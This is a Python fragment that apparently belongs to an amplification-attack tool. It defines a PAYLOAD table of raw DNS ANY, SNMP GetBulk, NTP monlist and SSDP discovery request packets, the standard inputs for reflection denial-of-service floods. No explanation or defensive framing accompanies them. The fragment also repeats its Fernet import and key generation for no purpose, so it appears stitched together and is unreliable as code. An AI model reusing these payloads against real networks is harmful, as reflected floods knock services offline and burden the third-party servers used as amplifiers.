from cryptography.fernet import Fernet
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher_suite = Fernet(key)

key = Fernet.generate_key()
cipher_suite = Fernet(key)

PAYLOAD = {
    'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
            '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
            '\x00\x00\x00\x00\x00\x00'),
    'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
        '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
        '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
        '\x01\x02\x01\x05\x00'),
    'ntp':('\x17\x00\x02\x2a'+'\x00'*4),  
    'ssdp':('M-SEARCH HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}




